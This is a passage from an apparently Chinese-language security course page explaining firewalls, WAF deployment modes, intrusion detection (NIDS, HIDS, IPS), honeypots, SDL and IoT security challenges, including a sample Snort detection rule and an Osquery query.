Firewall）。防火长城的主要目的不是为了防止国外对中国发起网络攻击，而是根据法律法规，防止国内网民访问国外违法的数据信息。同样地，美国也存在类似的防火墙设备，比如：根据美国儿童网络保护法令（CHIPA），学校和图书馆的网络必须限制学生可以浏览的网页。</p><p>除了防止非法地获取数据，防火墙同样能够防止敏感数据的流出。比如，防火墙可以对部分关键词或者敏感词进行检测阻止其外流。如果数据安全做得好一些的公司，可以对公司内的全部数据打上标签，然后根据标签的安全等级对跨越安全边界的数据进行处理。</p><p>需要注意的是，防火墙能够提供的数据安全保护是有限的。原因在于，大部分防火墙都是用来处理较低层级的数据，且很多连接会对数据本身进行加密（VPN、HTTPS）。这就导致了防火墙实际能够看到的可识别数据并不多，拦截能力因此下降。其实，这种绕过防火墙的例子很常见，各类“梯子”能翻墙访问 Google 就是基于这个原理实现的。<strong>需要注意的是私建VPN是非法行为</strong></p><h4 id="限制可访问的服务和审计"><a href="#限制可访问的服务和审计" class="headerlink" title="限制可访问的服务和审计"></a>限制可访问的服务和审计</h4><p>防火墙作为安全策略的一部分，还可以帮助公司落地安全制度。公司所有对于网络方面的限制和要求，基本都可以在防火墙上进行实现。比如：限制外网开放的服务只能是 HTTP 服务，那么所有非 HTTP 的请求就会被拦截；再比如，防火墙也可以对带宽的使用进行限制，避免某个服务抢占全部的带宽资源。</p><p>除此之外，防火墙作为网络安全设备，它的日志功能通常比路由器等常规网络设备更加完备。因此，在网络攻击发生之后，我们需要进行事件调查时，防火墙日志是很关键的信息来源。</p><h3 id="防火墙有哪些防御盲区？"><a href="#防火墙有哪些防御盲区？" class="headerlink" title="防火墙有哪些防御盲区？"></a>防火墙有哪些防御盲区？</h3><p>我们知道，防火墙不仅是网络安全中很重要的组成部分，也是我们最为熟知的安全工具。但是，在安全领域中不存在绝对，所以防火墙对于某些攻击也同样无能为力。接下来，我会主要讲解防火墙不能防御的攻击手段，在了解这些攻击之后，我们才能提高对防火墙和网络安全的整体认识。</p><p>首先，防火墙只位于网络边界。因此，防火墙只能用来对跨越边界的请求进行检测和拦截。当请求通过后，后续发起的攻击请求对于防火墙来说，就是不可见的。比如，当黑客利用弱密钥，通过合法的 SSH 登录到服务器之后，就相当于穿透了防火墙的保护，之后黑客再通过 SSH 执行的命令，防火墙都无法检测和拦截。所以，防火墙不能防御已授权服务中的恶意攻击。</p><p>其次，尽管防火墙位于网络边界，但这并不意味着所有的请求都会经过防火墙。比如，直接通过物理网线接入到服务器，黑客就可以在不经过防火墙的情况下进入内网（黑客偷偷潜入机房，[认真脸]）。在这种情况下，防火墙自然也起不到任何作用了。同样地，在网络内部发生的攻击行为，也不在防火墙的保护范围内。也就是说，防火墙不能防御不通过防火墙的访问。</p><p>最后，作为边界设备，防火墙自身其实是暴露在外界的。因此，防火墙会遭受到黑客的直接攻击。如果防火墙自身的操作系统存在缺陷，那么，黑客就能够直接攻击并控制防火墙，然后关闭防火墙的防护功能，轻松突破边界。正是因为如此，部分防火墙厂商会为防火墙设备专门设计和开发一个加固过的专用操作系统，以此来提高防火墙的安全性。</p><h2 id="WAF：如何为漏洞百出的Web应用保驾护航？"><a href="#WAF：如何为漏洞百出的Web应用保驾护航？" class="headerlink" title="WAF：如何为漏洞百出的Web应用保驾护航？"></a>WAF：如何为漏洞百出的Web应用保驾护航？</h2><p>随着 Web 应用越来越多，黑客的攻击目标也逐渐转向了针对 Web 安全的攻击。传统的防火墙主要专注于网络层的攻击防御，对 Web 安全的防御能力相对欠缺。因此，WAF（Web Application Firewall，Web 应用防护系统）的概念也就被提了出来。WAF 说白了就是应用网关防火墙的一种，它只专注于 Web 安全的防御，近几年来逐渐被当成一个相对独立的产品方向来研究。</p><h3 id="WAF-的工作模式"><a href="#WAF-的工作模式" class="headerlink" title="WAF 的工作模式"></a>WAF 的工作模式</h3><p>WAF 的本质是“专注于 Web 安全的防火墙”，Web 安全关注于应用层的 HTTP 请求。因此，WAF 的分析和策略都工作于应用层。</p><p>在 Web 安全这个方向上，WAF 对比防火墙又做出了哪些改进呢？我们可以从 WAF 的三种工作模式入手，探讨这两者的区别。这三种工作模式分别是：透明代理、反向代理和插件模式。</p><p><strong>透明代理和大部分防火墙的工作模式相同</strong>：在客户端和服务端通信不需要作出任何改变的情况下，对 HTTP 流量进行请求和转发。在这个过程中，为了解密 HTTPS 流量，WAF 必须和服务端同步 HTTPS 对称密钥。</p><p><img src="/images/security/security-linux/16.jpg" alt="16"></p><p>透明代理的优点就是容易部署，它不需要客户端和服务端进行任何改动。但是，透明代理的缺点也有很多。透明代理本身不是一个 Web 服务，所以它无法修改或者响应 HTTP 的请求，只能够控制请求的通过或者拒绝。正因为如此，它也无法实现 Web 服务所提供的认证、内容过滤等功能。</p><p><strong>区别于透明代理，反向代理要求客户端将请求的目标地址指向 WAF，而不是服务端</strong>。在反向代理工作模式中，服务端接收的请求，实际上也是由 WAF 发起的。在这个过程中，WAF 本身就相当于一个 Web 服务，只不过对所有的 HTTP 请求都进行了转发。</p><p><img src="/images/security/security-linux/17.jpg" alt="17"></p><p>因为反向代理 WAF 本质上是一个 Web 服务，所以 HTTPS 证书可以直接部署在 WAF 上。WAF 在对 HTTPS 流量解密之后，就可以在内网中用 HTTP 的形式，向服务端发起代理请求了。</p><p>而且，反向代理 WAF 作为一个 Web 服务，能够提供的功能也更加丰富。比如，WAF 可以充当一个前置的认证平台，对所有请求进行身份校验和身份管理。同时，也因为在反向代理工作模式中，客户端和服务端不直接通信，而是将全部请求都先请求到 WAF 上，所以反向代理 WAF 对服务端的隔离也更加彻底。</p><p>但是，反向代理同样存在缺点。首先，功能更丰富意味着性能开销更大。因此，反向代理 WAF 对硬件要求更高。其次，反向代理 WAF 一旦宕机，就无法响应客户端的任何请求。这样一来，即使服务端仍然正常，但用户已经无法正常使用应用了。而对于透明代理 WAF 来说，如果 WAF 宕机了，只是无法提供 Web 防护而已，客户端和服务端的通信不会受到任何影响。</p><p><strong>最后，我们来看插件模式</strong>。在插件模式中，WAF 不再是网络中一个独立的安全产品了，而是以插件的形式依附于 Web 服务端本身，为 Web 安全提供防护。</p><p>那怎么才能将 WAF 植入到服务端的逻辑中呢？我们最常使用的一种技术就是AOP（Aspect Oriented Programming，面向切面编程）技术。在 AOP 技术中，WAF 可以作为一个切片植入到服务端的逻辑中。</p><p><img src="/images/security/security-linux/18.jpg" alt="18"></p><p>而且，目前 AOP 技术十分流行，各类编程语言都支持。所以，插件模式的 WAF 部署同样十分简单。但是，这种将 WAF 和服务端强耦合的方式，会带来一定的负向影响。</p><p>首先，WAF 和服务端一块工作在服务器上，会消耗服务器额外的资源，对 Web 服务本身的性能产生影响。</p><p>其次，WAF 和服务端耦合，也就意味着 WAF 的所有改动都会直接影响到服务端。对于代理模式的 WAF 来说，通常只需要自测就可以升级了。而对于插件模式的 WAF，它本身的升级必须和服务端一起进入评估和测试流程，就会增加额外的工作量。</p><p><img src="/images/security/security-linux/19.jpg" alt="19"></p><p>总结一下，关于 WAF 的三种工作模式，你需要重点掌握这些内容：首先，WAF 将处理的请求协议限定为 HTTP，所以 WAF 比应用网关防火墙具备更高的专业性和灵活性；其次，WAF 可以以代理的形式，在网络中提供 Web 安全防护，也可以作为插件嵌入到服务端中；最后，我们也可以根据需求、成本和硬件环境等因素，选择不同的部署模式对 Web 安全进行防护。</p><h3 id="WAF-的功能"><a href="#WAF-的功能" class="headerlink" title="WAF 的功能"></a>WAF 的功能</h3><h4 id="HTTP-解析能力"><a href="#HTTP-解析能力" class="headerlink" title="HTTP 解析能力"></a>HTTP 解析能力</h4><p>我们知道，WAF 专注于 Web 安全。因此，对 HTTP 请求进行解析是 WAF 最基础的能力。在 HTTP 中，通用的内容包括：请求的 URL 以及其中的参数、HTTP 头部信息、POST 的 body 内容等。</p><p>除此之外，某些攻击特征可能隐藏得比较深，比如 JSON 中的某个字段，无法通过 JSON 的整体内容检测出来，我们必须一个字段一个字段去判断。因此，WAF 还需要解析 XML、JSON 等 RPC 传输协议，能够理解对应的 key 和 value 分别是什么。</p><p>除了单纯地解析内容，WAF 还需要对 HTTP 内容做必要地处理。为什么要这么做呢？这主要有两方面原因</p><p>第一，HTTP 中的内容可能经过了 UrlEncode 等编码方式的处理，因此，WAF 需要具备解码能力，避免攻击的特征通过编码来进行绕过。</p><p>第二，想要看到 HTTPS 中的加密内容，WAF 必须能够解密 HTTPS 请求。在透明代理模式中，WAF 需要和服务端同步 HTTPS 的密钥，才能够获得解密的请求；在反向代理中模式中，WAF 自带证书，可以直接解密；在插件模式中，WAF 依靠服务端解密请求之后，再进行 HTTP 的解析。</p><h4 id="Web-安全防护"><a href="#Web-安全防护" class="headerlink" title="Web 安全防护"></a>Web 安全防护</h4><p>通过对 HTTP 请求进行解析、对编码内容进行解码和对 HTTPS 进行解密之后，WAF 就能够获得全部 HTTP 请求内容了。在此基础之上，WAF 就可以对请求内容进行分析，为 Web 服务提供安全保护了。</p><p>三种主要的分析手段：</p><ul><li>签名匹配：和杀毒软件中病毒库的概念类似，WAF 也可以维护一个攻击样本库。样本库中存有已知攻击请求的散列签名，只要 HTTP 请求内容的散列签名在这个样本库，就说明 HTTP 请求中携带了攻击内容。</li><li>正则匹配：签名匹配需要请求完全一致才能够检测出来，而正则匹配只需要部分特征就可以检测。WAF 可以通过抽象一些攻击特征的正则表达式，对 HTTP 请求进行检测。比如，如果请求的某个参数中出现了单引号，那么很有可能就是黑客发起的 SQL 注入攻击。</li><li>行为分析：除了针对单次请求的分析之外，WAF 还可以针对连续的访问请求特征进行提取和分析。为什么要这么做呢？这是因为，很多时候，我们无法准确判断单次请求是不是攻击请求，但是如果疑似的攻击请求频繁出现，我们就基本能够确定了。也就是说，一个用户不会频繁地访问同一个页面，而黑客需要对一个漏洞点发起多次尝试，才能够实现攻击的效果。</li></ul><p>在识别到攻击的请求之后，WAF 就可以对请求进行拦截，从而避免 Web 服务受到黑客的攻击了。</p><h4 id="审计告警"><a href="#审计告警" class="headerlink" title="审计告警"></a>审计告警</h4><p>WAF 还有另外一个重要的功能，就是为 Web 服务提供安全相关的审计和告警功能。Web 安全相关的审计包括：发生攻击的时间、路径、频次等。通过这些信息，开发人员能够知道自己的 Web 服务面对的攻击威胁是什么样的，也就能够更好地评估威胁，完善 Web 安全防护机制。</p><p>除此之外，WAF 还能提供其他的审计能力。这是因为，WAF 能够解析出 HTTP 请求的全部内容，提供审计所需要的全部日志字段。这些日志可以是各个页面的访问次数、用户的访问行为和接口的响应性能等。尽管这些指标和安全没有太多关系，但是它们对于产品设计和服务质量来说都很常见，那么 WAF 就可以作为一个统计分析工具，来为你提供服务。</p><h4 id="数据保护和虚拟补丁"><a href="#数据保护和虚拟补丁" class="headerlink" title="数据保护和虚拟补丁"></a>数据保护和虚拟补丁</h4><p>反向代理或者插件模式的 WAF，还能够对 HTTP 请求中的数据进行一定的处理，提供额外的数据保护功能。</p><p>最简单的，WAF 可以加密 HTTP 响应中的 Cookie 内容，使得 Cookie 以保密的形式存储在浏览器中。当浏览器将加密后的 Cookie 附加到 HTTP 请求中的时候，WAF 又可以进行解密。这样一来，服务端接收到的始终是明文的信息，而实际上，WAF 通过加解密为 Cookie 提供了额外的保护。另外，WAF 还可以对返回内容中的手机号、身份证号等敏感字段进行统一的打码处理，避免因为开发的疏忽，导致这些敏感信息的泄露。</p><p>在介绍插件漏洞的时候，我们提到了防火墙可以提供虚拟补丁的功能，来临时对插件漏洞进行修复。如果插件是 Web 相关的服务，那么 WAF 是不是也可以提供虚拟补丁的功能呢？当然是可以的。那 WAF 是如何提供虚拟补丁的呢？我来举个简单的例子。</p><p>在经典的 Structs 2 漏洞中，黑客是通过 Structs 2 中包含的漏洞接口发起攻击的。所以，WAF 只需要将这些包含漏洞的接口进行封禁，或者对请求内容中的 Structs 2 攻击特征（特定接口的异常序列化数据）进行分析拦截，就能够临时避免 Structs 2 受到已公开的漏洞攻击。之后，我们只需要对 Structs 2 进行升级再打上补丁，这样就可以下线虚拟补丁了。</p><blockquote><p>微服务通常都有统一的网关入口，因此WAF一般是和网关放在一块的。如果是自己实现的话，一般都是以Nginx的Lua插件来完成的。如果是引用的开源或者商用版本，一般WAF是串联在网关之前或者之后来进行过滤。经过网关处的WAF过滤后，内部微服务直接的HTTP调用就可以当作可信来处理了。</p></blockquote><h2 id="IDS：当黑客绕过了防火墙，你该如何发现？"><a href="#IDS：当黑客绕过了防火墙，你该如何发现？" class="headerlink" title="IDS：当黑客绕过了防火墙，你该如何发现？"></a>IDS：当黑客绕过了防火墙，你该如何发现？</h2><p>无论是防火墙还是 WAF，都无法达到 100% 的防护效果。黑客总是能有很多其他的办法，来隐藏自己或者直接绕过这些保护机制。因此，我们仍然需要对内网中的行为进行检测，及时发现已经入侵到内网中的黑客。这就需要用到 IDS（Intrusion Detection System，入侵检测系统）了。</p><h3 id="什么是-IDS？"><a href="#什么是-IDS？" class="headerlink" title="什么是 IDS？"></a>什么是 IDS？</h3><p>IDS 的最终目的是检测黑客的攻击行为。那我们应该在哪里进行检测呢？首先是在网络流量中：黑客在控制了一台服务器之后，需要进行权限提升，而权限提升需要黑客在内网中挖掘各个服务器存在的漏洞。因此，黑客会发起很多探测和攻击的网络请求。其次就是在服务器系统中，黑客也可以利用服务器系统或应用本身的漏洞进行权限提升，同时，黑客也会尝试在系统中留下后门，这些行为都是通过系统操作来完成的。</p><p>因此，根据检测内容的不同，IDS 可以分成两种类型：NIDS（Network Intrusion Detection System，网络入侵检测系统）和 HIDS（Host-based Intrusion Detection System，基于主机型入侵检测系统）。</p><h4 id="第一种类型：NIDS"><a href="#第一种类型：NIDS" class="headerlink" title="第一种类型：NIDS"></a>第一种类型：NIDS</h4><p>在讲防火墙的时候，我们提到防火墙存在盲区：防火墙只能够检测穿越网络边界的流量，如果黑客已经进入到了内网，那防火墙就没办法提供任何的安全防护了。这个时候，我们就需要使用 NIDS 了。</p><p>NIDS 主要检测网络流量中的攻击行为。区别于部署在网络边界的防火墙，NIDS 一般部署在内网的网络节点（路由器或交换机）中，所有的网络请求都会流经这些网络节点，所以，NIDS 基本可以获取到对应网络节点下全部的网络行为。</p><p>另外，和防火墙不同的是，NIDS 一般不具备拦截网络请求的能力。这也让 NIDS 能够很好地隐蔽自己，让黑客很难发现。对于防火墙和 WAF 来说，黑客总是会不断尝试各种方式来绕过这些安全产品，原因就是黑客知道自己被拦截了。因此，这些安全产品需要不断地更新规则策略对抗黑客。如果黑客都不知道 NIDS 的存在，就不会刻意地去绕过 NIDS 的检测，这也使得 NIDS 的检测能力比较稳定，不需要频繁地更新规则策略。</p><p>NIDS 是一个比较经典的安全产品，你可以直接使用市面上的开源工具，比如：Snort、Suricata等。这些工具也依据 CVE 库开发了完整的入侵检测规则。以 Snort 的一条检测规则为例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Rule Header  Message alert tcp <span class="variable">$EXTERNAL_NET</span> <span class="variable">$HTTP_PORTS</span> -&gt; <span class="variable">$HOME_NET</span> any</span><br><span class="line">Message   msg: “BROWSER-IE Microsoft Internet Explorer CacheSize exploit attempt”;</span><br><span class="line">Flow     flow: to_client,established;</span><br><span class="line">Detection  file_data;</span><br><span class="line">        content:<span class="string">"recordset"</span>; offset:14; depth:9;</span><br><span class="line">        content:<span class="string">".CacheSize"</span>; distance:0; width:100;</span><br><span class="line">        pcre:<span class="string">"/CacheSize\s*=\s*/"</span>;</span><br><span class="line">        byte_test:10,&gt;,0x3ffffffe,0,relative,string;</span><br><span class="line">Metadata   policy max-detect-ips drop, service http;</span><br><span class="line">Reference  reference:cve,2016-8077;</span><br></pre></td></tr></table></figure><p>这个规则是用来检测 CVE 2016-8077 的。CVE 2016-8077 的攻击原理就是，黑客先构建一个恶意网站，如果用户使用 IE 浏览器访问了这个网站，就会被黑客控制。因此，在第一行的 Rule Header 中，定义了 NIDS 需要检测从外网 HTTP 服务返回给本地的 TCP 请求，也就是检测用户访问了一个网页并收到的返回请求。然后再 Detection 这个部分，对该漏洞的关键词进行正则匹配，也就是”/CacheSize\s<em>=\s</em>/“。这样一来，我们就能够发现，黑客通过这个 CVE 漏洞控制用户 IE 浏览器的攻击行为了。</p><p>所以，我们在使用 NIDS 的时候，只要注意及时对规则进行维护即可。从 Snort 的规则中，我们也可以看出，NIDS 的检测逻辑就是对请求的内容进行正则匹配，不具备分析上下文的能力。因此，NIDS 一般只能够对单次的攻击请求进行检测。</p><h4 id="第二种类型：HIDS"><a href="#第二种类型：HIDS" class="headerlink" title="第二种类型：HIDS"></a>第二种类型：HIDS</h4><p>精明的黑客在控制了服务器之后，会尽可能避免发送大量的网络请求，以此来隐藏自己。那么，我们是不是就没办法发现黑客了呢？当然不是。无论多么精明的黑客也一定会在服务器上留下各种痕迹。不管是入侵的时候，通过各种 Web 漏洞执行了系统命令，还是入侵成功之后，在系统中埋下了后门，又或者是直接利用系统漏洞进行权限提升，这些操作最终都会在服务器系统上执行。因此，我们可以通过监控各个用户在服务器系统上的行为来检测黑客的存在。这就是 HIDS 的功能了。</p><p>HIDS 主要检测服务器系统中的攻击行为。NIDS 运行在某个网络节点之上，相当于集中式的对网络流量进行检测，但是 HIDS 运行于每一个服务器中，也就相当于对系统行为进行分布式检测。那分布式的行为处理有什么好处呢？在 NIDS 中，我们是基于少量的网络节点检测全部的网络流量。而在 HIDS 中，只需要每个服务器检测各自内部的行为，也就相当于将资源消耗分散到了每一台服务器中，这就对硬件的性能要求比较低，也就节约了公司的防护成本。</p><p>另外，HIDS 一般以 ROOT 权限运行在操作系统中。因此，HIDS 能够监控的行为更丰富，比如：</p><ul><li>执行的系统命令</li><li>发起和接受的网络请求</li><li>运行的进程、监听的端口号等</li><li>系统关键文件的完整性</li><li>其他黑客可能留下痕迹的地方</li></ul><p>对比于 NIDS，HIDS 的开发难度会高很多。主要是因为 NIDS 只需要部署在关键的网络节点上，一个公司可能也就有几百个这样的节点，而 HIDS 需要部署在公司所有的服务器中，一个公司有上万个服务器是很常见的事情。而且，我们会在日常使用中频繁改动服务器，这也使得服务器的系统环境很不统一。所以，很多公司都需要基于自己的情况自行开发 HIDS。</p><p>据我了解，很多公司都会基于Osquery来开发 HIDS。Osquery 提供的信息采集功能可以满足大部分的 HIDS 需求，我们只需要运行一句简单的 SQL 语句，就能够拿到系统的关键信息了。比如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 通过这段代码，我们可以从 Osquery 中获取到当前的全部进程信息。</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span>, <span class="keyword">path</span>, pid <span class="keyword">FROM</span> processes</span><br></pre></td></tr></table></figure><h4 id="第三种类型：IPS"><a href="#第三种类型：IPS" class="headerlink" title="第三种类型：IPS"></a>第三种类型：IPS</h4><p>在 HIDS 和 NIDS 中，我们分别通过网络行为和服务器系统行为对黑客入侵进行检测。但是，你需要注意，它们都只是检测而已。也就是说，如果你不进行人工干预的话，黑客的入侵行为并不会受到任何影响，仍然可以持续进行。精明的黑客一定会选择夜半三更的时候发起攻击，等你睡觉起来，黑客早已经拿到它们想要的数据了，而你只能看着 HIDS 和 NIDS 给出的一堆报警无可奈何。</p><p>这显然不是我们希望的结果。因此，我们在 NIDS 和 HIDS 中加入了拦截的能力，就成了 NIPS 和 HIPS，统称为 IPS（Intrusion Prevention System，入侵防御系统）。IDS 和 IPS 是相辅相成的，它们唯一的区别在于，IDS 强调的是检测，IPS 强调的是拦截。当发现了黑客的攻击行为后，IDS 会产生报警，然后公司的安全响应人员会对报警进行人工处理。IPS 同样会产生报警，不过报警的同时，IPS 会尝试对黑客的行为进行拦截，在第一时间限制攻击产生的影响范围。</p><p>IPS 的实现总体和 IDS 比较类似，只是 IDS 通常不会去修改网络节点和操作系统，而 IPS 会实现额外的逻辑，对网络节点和系统内的行为进行封停，从而阻止黑客入侵。</p><p><img src="/images/security/security-linux/20.jpg" alt="20"></p><h3 id="什么是蜜罐？"><a href="#什么是蜜罐？" class="headerlink" title="什么是蜜罐？"></a>什么是蜜罐？</h3><p>在 IDS 的检测机制中，我们主要是基于对系统行为和网络请求的分析，判断是否存在攻击行为。这种检测模式会存在两个主要的问题：第一，分析结果总会出现漏报和误判，而这些漏报和误判，不论是对用户还是对安全人员，都会造成极大的困扰；第二，分析的规则都是人工产出的，会存在滞后性。当某种新型攻击出现时，我们很可能无法及时更新 IDS 的检测规则，让 IDS 形同虚设。那么，我们应该如何提升分析的准确性呢？对于未知的攻击，我们又该如何及时发现呢？蜜罐就是一种能满足这两点需求的入侵检测工具。</p><p>所谓“蜜罐”，就是一台部署在内网的服务器。这个服务器没有任何保护措施，并且提供带有漏洞的服务，就是为了吸引黑客来攻击它。蜜罐由安全人员部署在网络的各个节点中，理论上，其他开发人员都不会知道蜜罐的存在，也就不会向蜜罐发起任何请求。而黑客入侵内网后，需要对内网进行探测，如果发现蜜罐中的服务有漏洞，自然就会针对蜜罐发起攻击。因此，蜜罐内的一切行为，都是黑客产生的。基于蜜罐的报警和日志，我们就能够及时发现黑客的存在，并且还原出黑客的攻击行为。</p><p>蜜罐的类型主要分为两种：低交互蜜罐和高交互蜜罐。</p><p>所谓低交互蜜罐，就是蜜罐内的所有服务都是模拟的，不能提供真实的服务功能。比如，低交互蜜罐为了模拟一个弱密码的 SSH 服务，它会监听 22 端口。而黑客一旦向这个 22 端口发起 SSH 登录请求，蜜罐就会返回登录成功的响应。但是，蜜罐并没有提供真实的 SSH 服务，只是模拟了一个登录成功的响应而已，所以黑客并不能通过 SSH 连接上服务器。</p><p>高交互蜜罐会提供一个真实的服务，而且不施加任何限制，只是用来做详细的记录而已。还是以上面 SSH 登录为例，在高交互蜜罐中，蜜罐会开启一个真实的 SSH 服务，黑客能够通过 SSH 连入并且控制蜜罐。但是，黑客连入蜜罐后的所有行为都会被记录下来，并产生报警。而我们只需要及时处理报警赶走黑客，就可以降低蜜罐被控制后所产生的影响。</p><p>低交互蜜罐和高交互蜜罐的对比也很明显。低交互蜜罐更安全，因为它不提供真实的带有漏洞的服务，只是模拟服务，所以黑客无法控制蜜罐。但模拟的服务可能被黑客发觉，导致黑客不上钩。这个时候，高交互蜜罐对黑客更有吸引力，让我们能有更大的概率发现入侵攻击的行为。</p><p>对比于 IDS，蜜罐提供了额外的入侵检测能力，它的主要优势包括：</p><ul><li>蜜罐几乎不会产生误报</li><li>蜜罐内的所有行为都是真实的黑客攻击行为，因此数据量小、价值高</li><li>不需要已知的攻击样本，根据黑客的行为我们甚至能够发现新的攻击方式</li></ul><p>当然，蜜罐也是有缺陷的。它的主要缺陷就是，入侵检测的实现非常依靠运气，实现的前提是必须有黑客找到蜜罐。也就是说，如果黑客进入内网后，首先发现其他带有漏洞的正常服务器，就不会进入到蜜罐中了。</p><p>蜜罐的实现比较复杂，它需要恰到好处地把握提供多少的交互，既能吸引黑客，又不至于产生漏洞。好在你并不需要关心它的具体实现，因为网上已经有不少成熟的开源蜜罐了，你可以直接拿来使用。</p><h3 id="如何构建入侵检测体系？"><a href="#如何构建入侵检测体系？" class="headerlink" title="如何构建入侵检测体系？"></a>如何构建入侵检测体系？</h3><p>在了解了 IDS、IPS 和蜜罐之后，我们发现这几款入侵检测工具各有其优势和不足。因此，在实际的安全防护中，我们通常会将它们组合起来使用。</p><p>首先，蜜罐具备较高的准确率，并且能够发现未知的攻击。因此，我们可以将蜜罐中黑客的行为特征作为攻击样本的特征，输入到 IDS 和 IPS 中去。这样一来，IDS 和 IPS 就具备了根据黑客行为自动学习和升级的能力。</p><p>其次，IPS 通常是直接拦截黑客的攻击行为，来及时止损。但这样一来，黑客也会察觉到入侵检测系统的存在。因此，我们可以将 IPS 的检测拦截行为，调整为一旦检测到攻击行为，就将行为转发到蜜罐中。对于黑客来说，攻击行为看起来仍然是成功的，但实际上不会对系统产生任何影响，且攻击行为都被记录下来了。</p><p>最后，为了提升黑客发现蜜罐的概率，我们通常需要在内网中广泛地部署蜜罐。但是，这又增加了很多额外的硬件部署成本。因此，有的 HIDS 中会嵌入“微蜜罐”，就是利用服务器本身的资源实现一个小型的蜜罐服务。比如，某个部署 HIDS 的服务器中本来没有 MySQL 服务，也没有监听 3306 端口，我们可以通过设置服务器，让 HIDS 监听 3306 端口并模拟一个 MySQL 服务出来。这个 MySQL 服务是 HIDS 模拟的，开发人员不会感知到，所以发起 MySQL 连接的一定是黑客。这就是“微蜜罐”。</p><p>一个系统化的入侵检测系统需要依靠各个安全产品之间的相互协作，才能够实现防护能力的最大化。下面是一个成熟的入侵检测系统的组织结构图</p><p><img src="/images/security/security-linux/21.jpg" alt="21"></p><p>在这个入侵检测系统中，NIDS 负责对网络节点进行检测，网络中会包含部署了 HIDS 的系统和蜜罐系统。最终，我们需要通过 ELK 来统一收集各个安全产品的检测日志，实现信息同步。所有 IDS 或者 IPS 的信息都是相互关联的，我们就能够基于这个完整的信息进行全盘的综合分析了。</p><p>我们经常会使用 SIEM（Security Information and Event Management，安全信息和事件管理），来帮助我们运营一个安全体系。通过 SIEM，我们可以将散落于各个系统、设备和安全产品中的日志进行汇总和梳理，快速串联出黑客的完整攻击路径，更高效地完成安全体系运营的工作。简单来说，SIEM 就是一个基于各类日志，提供安全运营和管理能力的统一平台。</p><h2 id="SDL：怎样才能写出更“安全”的代码？"><a href="#SDL：怎样才能写出更“安全”的代码？" class="headerlink" title="SDL：怎样才能写出更“安全”的代码？"></a>SDL：怎样才能写出更“安全”的代码？</h2><p>2004 年，微软提出了 SDL（Security Development Lifecycle，安全开发生命周期）。因为对安全和隐私的考虑贯穿了整个软件的开发进程，SDL 能够帮助开发人员写出更“安全”的代码，在解决安全合规需求的同时，也能减少由安全问题带来的损失。</p><h3 id="SDL-中的基础概念"><a href="#SDL-中的基础概念" class="headerlink" title="SDL 中的基础概念"></a>SDL 中的基础概念</h3><p>我们先来看一个软件开发中的经典概念：软件开发生命周期 DLC（Software Development Life Cycle）（这个概念的英文缩写种类比较多，为了和 SDL 区分，我们用 DLC 代表软件开发生命周期）。SDL 是以软件开发生命周期为基础发展成的安全框架，所以，了解 DLC 能够帮助我们更好地认识 SDL。</p><p>DLC 将软件开发过程分为 5 个阶段：需求分析、设计、开发、测试和部署。DLC 对5 个阶段的具体描述，都是以业务功能为核心进行展开的，并没有涵盖安全的工作。这显然不安全。</p><p>而且我们都知道，安全问题对公司的威胁是客观存在的。因此，很多公司将安全纳入到测试的工作中。但是，这种做法会导致两个问题：第一，安全问题要等到软件开发完成后才能发现。这个时候，因为一个安全隐患（不是 BUG），让开发人员重启开发流程，推动上会遇到较大的阻力；第二，只能关注到最终完成的软件，往往会导致安全人员因为对业务了解不足，漏过一些安全隐患。这些问题的出现，让业内亟需一个能够更好地满足安全需求的软件开发流程，SDL 也就应运而生了。</p><h3 id="什么是-SDL？"><a href="#什么是-SDL？" class="headerlink" title="什么是 SDL？"></a>什么是 SDL？</h3><p>SDL 的出现不是为了颠覆传统的 DLC 框架，而是希望在 DLC 中加入足够清晰的安全需求，以此来为软件开发的过程提供完整的安全防护。SDL 的标准执行流程有 7 个步骤：安全培训、需求分析、设计、开发、测试、部署和响应。流程如下图：</p><p><img src="/images/security/security-linux/22.jpg" alt="22"></p><h2 id="安全新技术：IoT、IPv6、区块链中的安全新问题"><a href="#安全新技术：IoT、IPv6、区块链中的安全新问题" class="headerlink" title="安全新技术：IoT、IPv6、区块链中的安全新问题"></a>安全新技术：IoT、IPv6、区块链中的安全新问题</h2><h3 id="独特的-IoT-安全"><a href="#独特的-IoT-安全" class="headerlink" title="独特的 IoT 安全"></a>独特的 IoT 安全</h3><p>毫无疑问，IoT（Internet of Things，物联网）是最近十年来比较火热的一个技术。对比于当前的网络环境，IoT 的网络主要有以下几个特点：</p><ul><li>设备更多：每一件小的物品都有可能成为联入互联网的设备</li><li>设备性能更低：受限于体积和供电量，单台设备能够搭载的硬件配置都不高</li><li>更加开放：由于设备的数量和类型众多，无法统一标准，因此 IoT 的 网络环境也更加开放</li></ul><blockquote><p>那么，这些特点会给安全性带来哪些新的挑战呢？关于这个问题，我推荐你玩一玩《看门狗》这款游戏，它很好地描绘了一个未来 IoT 城市中会面临的各类安全问题。</p></blockquote><h4 id="认证更加复杂了"><a href="#认证更加复杂了" class="headerlink" title="认证更加复杂了"></a>认证更加复杂了</h4><p>在使用电脑或者手机连入网络的时候，我们可以手动输入密码来完成认证。但是，当我们想要将各类小硬件连入网络的时候，没有键盘和屏幕可以供我们输入密码。为了解决这个认证问题，目前小米等 IoT 厂商的解决方案是，先让手机直接控制设备，配置好 WiFI 密码后，再让设备连入网络。</p><p>但是，这其实又引发了一个新的问题，如何确认是你本人在控制设备，而不是黑客呢？针对这个问题，现在也有对应的解决方案，那就是在短时间内开放设备的控制权限，限制手机在这个时间内完成对设备的控制。</p><p>仔细观察的话，你会发现这个解决方案有一个假设前提：黑客没办法在短时间内发现并控制设备。在当前的环境下，这个前提是成立的。但是随着技术的发展，IoT 设备可能充斥在我们身边的每一个角落里，当有一个设备被黑客控制了之后，它很可能会时刻监控这周围的环境，一旦发现其他的设备开放控制权限，就会立即黑入。可以说，通过这样的攻击方式，任何一个设备都有可能被黑客所控制。</p><p>因此，如何确保 IoT 中设备与网络、设备与设备之间的通信是可信的，是未来认证技术需要面临的主要挑战之一。其次，我认为物理攻击会越来越流行。</p><p>物理攻击实际上是安全领域内的降维打击。 